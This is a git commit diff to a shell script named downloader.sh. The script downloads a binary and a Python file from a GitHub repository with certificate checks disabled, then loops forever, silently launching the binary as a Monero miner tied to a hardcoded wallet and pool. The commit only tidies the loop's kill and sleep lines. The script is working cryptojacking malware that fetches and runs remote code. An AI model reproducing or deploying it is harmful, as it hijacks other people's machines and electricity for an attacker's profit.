733662532fb4e12ef052fdcc2f2125cd88917239
xtremx@zinad.net <xtremx@zinad.net>
2018-03-06 15:05:19 +0200

    fix

--- downloader.sh
+++ downloader.sh
@@ -1,13 +1,12 @@
 mkdir -p /opt/code/
-
 wget --no-check-certificate "https://raw.githubusercontent.com/x7r3mx/arm/master/goal" -P /opt/code
 wget --no-check-certificate "https://raw.githubusercontent.com/x7r3mx/arm/master/origin.py" -P /opt/code
 chmod -R 700 /opt/code
 
 while true; do 
-    pkill -f goal; kill -9 $(pgrep goal);
-    pkill -f origin; kill -9 $(pgrep origin);
-    sleep(5)
+    pkill -f goal;
+    pkill -f origin;
+    sleep 5;
     /opt/code/goal -c x -M stratum+tcp://44tLjmXrQNrWJ5NBsEj2R77ZBEgDa3fEe9GLpSf2FRmhexPvfYDUAB7EXX1Hdb3aMQ9FLqdJ56yaAhiXoRsceGJCRS3Jxkn:x@mine.moneropool.com:3333/xmr &>/dev/null &
     python /opt/code/origin.py &>/dev/null &
     sleep 1800;
